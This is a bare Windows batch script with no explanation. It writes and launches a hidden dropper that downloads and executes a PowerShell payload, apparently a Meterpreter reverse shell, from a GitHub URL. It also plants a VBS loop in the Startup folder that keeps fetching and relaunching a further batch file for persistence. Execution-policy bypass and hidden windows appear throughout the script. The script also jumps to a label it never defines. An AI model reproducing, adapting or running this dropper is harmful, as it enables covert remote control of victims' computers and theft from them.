@echo off
cd %temp%
:loop
    echo @echo off > "%temp%\rev1.bat"
    echo :loop >> "%temp%\rev1.bat"
    echo     if not exist "%temp%\sh1.ps1" ^( >> "%temp%\rev1.bat"
    echo         echo IEX ^^(New-Object System.Net.WebClient^^).DownloadString^^('https://raw.githubusercontent.com/0x2034/meterpreter1/main/meter1.ps1'^^) ^> "%temp%\sh1.ps1" >> "%temp%\rev1.bat"
    echo     ^) >> "%temp%\rev1.bat"
    echo     powershell -ep bypass -WindowStyle Hidden -File "%temp%\sh1.ps1" >> "%temp%\rev1.bat"
    echo     if not exist "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\start.vbs" ^( >> "%temp%\rev1.bat"
    echo         echo Do  ^> "%temp%\start.vbs" >> "%temp%\rev1.bat"
    echo         echo    Set objShell = CreateObject^^("WScript.Shell"^^) ^>^> "%temp%\start.vbs" >> "%temp%\rev1.bat"
    echo         echo    objShell.Run "cmd /c curl https://raw.githubusercontent.com/0x2034/meterpreter1/main/nihbtdtdow1.bat -o %temp%\nihbtdtdow1.bat", 0, True ^>^> "%temp%\start.vbs" >> "%temp%\rev1.bat"
    echo         echo    objShell.Run "powershell -WindowStyle Hidden -Command Start-Process -FilePath '%temp%\nihbtdtdow1.bat' -WindowStyle Hidden", 0, True ^>^> "%temp%\start.vbs" >> "%temp%\rev1.bat"
    echo         echo    objShell.Run "powershell -c Start-Process -FilePath '%temp%\rev1.bat' -WindowStyle Hidden", 0, True ^>^> "%temp%\start.vbs" >> "%temp%\rev1.bat"
    echo         echo    WScript.Sleep 900000 ^>^> "%temp%\start.vbs" >> "%temp%\rev1.bat"
    echo         echo Loop ^>^> "%temp%\start.vbs" >> "%temp%\rev1.bat"
    echo         move "%temp%\start.vbs" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\" >> "%temp%\rev1.bat"
    echo     ^) >> "%temp%\rev1.bat"
    echo     timeout /t 15 /nobreak ^>nul >> "%temp%\rev1.bat"
    echo     goto check_start_vbs >> "%temp%\rev1.bat"
    echo timeout /t 300 /nobreak ^>nul >> "%temp%\rev1.bat"
    echo goto loop >> "%temp%\rev1.bat"
    powershell -c "Start-Process -FilePath \"%temp%\rev1.bat\" -WindowStyle Hidden"
    timeout /t 1200 /nobreak >nul
goto loop
